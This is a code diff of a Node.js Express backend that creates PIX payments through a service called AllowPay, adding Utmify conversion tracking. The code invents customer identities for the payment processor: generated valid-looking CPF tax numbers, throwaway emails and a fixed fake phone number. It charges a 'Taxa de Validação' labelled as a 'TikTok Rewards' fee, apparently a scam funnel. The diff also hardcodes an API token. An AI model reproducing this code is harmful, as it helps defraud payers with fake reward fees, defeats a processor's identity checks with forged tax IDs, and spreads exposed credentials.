@@ -1,4 +1,4 @@
-// server.js — Backend AllowPay PIX para Vercel
+// server.js — Backend AllowPay PIX para Vercel com Integração Utmify
 const express = require('express');
 const cors = require('cors');
 const app = express();
@@ -7,6 +7,11 @@ app.use(cors());
 app.use(express.json());
 
 const ALLOWPAY_BASE = 'https://allow-gi0i.onrender.com';
+const UTMIFY_TOKEN = '7GV8qIgl6tPmcGq009MT48SUcVgz7QPdRvNp';
+
+// Banco de dados temporário na memória para guardar os dados do cliente e UTMs de transações pendentes
+// Assim, quando receber a aprovação, podemos disparar para a Utmify os dados corretos do cliente e rastreamento.
+const transacoesTemp = new Map();
 
 // ─── Gera CPF matematicamente válido ───────────────────────────────────────
 function gerarCPF() {
@@ -24,6 +29,63 @@ function gerarCPF() {
   return [...n, d1, d2].join('');
 }
 
+// ─── Dispara evento para a Utmify ──────────────────────────────────────────
+async function enviarParaUtmify(dadosVenda) {
+  try {
+    console.log('[Utmify] Enviando evento para Utmify. Status:', dadosVenda.status, '| ID:', dadosVenda.orderId);
+    
+    const payload = {
+      orderId: dadosVenda.orderId,
+      platform: 'TikTok Rewards',
+      paymentMethod: 'pix',
+      status: dadosVenda.status, // "waiting_payment" ou "paid"
+      createdAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
+      approvedDate: dadosVenda.status === 'paid' ? new Date().toISOString().replace('T', ' ').substring(0, 19) : null,
+      customer: {
+        name: dadosVenda.customer.name,
+        email: dadosVenda.customer.email,
+        phone: dadosVenda.customer.phone,
+        taxId: dadosVenda.customer.taxId
+      },
+      products: [
+        {
+          id: 'tkt_rewards_upsell',
+          name: dadosVenda.productName || 'Taxa TikTok Rewards',
+          price: dadosVenda.amountCents / 100,
+          quantity: 1
+        }
+      ],
+      trackingParameters: {
+        src: dadosVenda.tracking.src || '',
+        utmSource: dadosVenda.tracking.utm_source || '',
+        utmMedium: dadosVenda.tracking.utm_medium || '',
+        utmCampaign: dadosVenda.tracking.utm_campaign || '',
+        utmContent: dadosVenda.tracking.utm_content || '',
+        utmTerm: dadosVenda.tracking.utm_term || ''
+      }
+    };
+
+    const resp = await fetch('https://api.utmify.com.br/api-credentials/orders', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'x-api-token': UTMIFY_TOKEN
+      },
+      body: JSON.stringify(payload),
+      signal: AbortSignal.timeout(10000)
+    });
+
+    if (!resp.ok) {
+      const errText = await resp.text();
+      console.error('[Utmify] Erro ao enviar dados de venda:', resp.status, errText);
+    } else {
+      console.log('[Utmify] Evento enviado com sucesso! Status:', dadosVenda.status);
+    }
+  } catch (err) {
+    console.error('[Utmify] Exceção ao enviar para Utmify:', err);
+  }
+}
+
 // ─── POST /api/pix/gerar ───────────────────────────────────────────────────
 app.post('/api/pix/gerar', async (req, res) => {
   try {
@@ -34,7 +96,16 @@ app.post('/api/pix/gerar', async (req, res) => {
       });
     }
 
-    const { nome, amount } = req.body;
+    const { 
+      nome, 
+      amount,
+      utm_source,
+      utm_medium,
+      utm_campaign,
+      utm_content,
+      utm_term,
+      src
+    } = req.body;
 
     if (!nome || nome.trim().split(/\s+/).length < 2) {
       return res.status(400).json({ error: 'Nome completo (nome e sobrenome) é obrigatório.' });
@@ -42,6 +113,9 @@ app.post('/api/pix/gerar', async (req, res) => {
 
     // Converte centavos — frontend envia centavos ou usa padrão 1937
     const amountCents = Number(amount) || 1937;
+    const customerEmail = `user${Date.now()}@mail.com`;
+    const customerPhone = '11999999999';
+    const customerCpf = gerarCPF();
 
     const payload = {
       api_key: apiKey,
@@ -49,9 +123,9 @@ app.post('/api/pix/gerar', async (req, res) => {
       description: 'Taxa de Validação',
       customer: {
         name: nome.trim(),
-        email: `user${Date.now()}@mail.com`,
-        cellphone: '11999999999',
-        taxId: gerarCPF()
+        email: customerEmail,
+        cellphone: customerPhone,
+        taxId: customerCpf
       }
     };
 
@@ -79,6 +153,34 @@ app.post('/api/pix/gerar', async (req, res) => {
     }
 
     console.log('[AllowPay] PIX criado! txid:', data.txid, '| route:', data.route);
+
+    // Estrutura de dados da venda para o rastreio da Utmify
+    const dadosVenda = {
+      orderId: data.txid,
+      amountCents,
+      productName: 'Taxa de Validação',
+      status: 'waiting_payment',
+      customer: {
+        name: nome.trim(),
+        email: customerEmail,
+        phone: customerPhone,
+        taxId: customerCpf
+      },
+      tracking: {
+        utm_source,
+        utm_medium,
+        utm_campaign,
+        utm_content,
+        utm_term,
+        src
+      }
+    };
+
+    // Salva na memória temporária para uso posterior na aprovação
+    transacoesTemp.set(data.txid, dadosVenda);
+
+    // Envia venda pendente (waiting_payment) de forma assíncrona para a Utmify
+    enviarParaUtmify(dadosVenda);
 
     return res.json({
       txid: data.txid,
@@ -127,6 +229,16 @@ app.post('/api/pix/status', async (req, res) => {
       return res.status(resp.status).json({
         error: data.error || `Erro ${resp.status} ao consultar status.`
       });
+    }
+
+    // Se o pagamento foi aprovado, dispara a venda paga ('paid') para a Utmify
+    if (data.status === 'approved') {
+      const dadosVenda = transacoesTemp.get(txid);
+      if (dadosVenda && dadosVenda.status !== 'paid') {
+        dadosVenda.status = 'paid';
+        transacoesTemp.set(txid, dadosVenda); // atualiza estado local
+        enviarParaUtmify(dadosVenda); // envia webhook de venda paga para a Utmify
+      }
     }
 
     return res.json({ status: data.status });
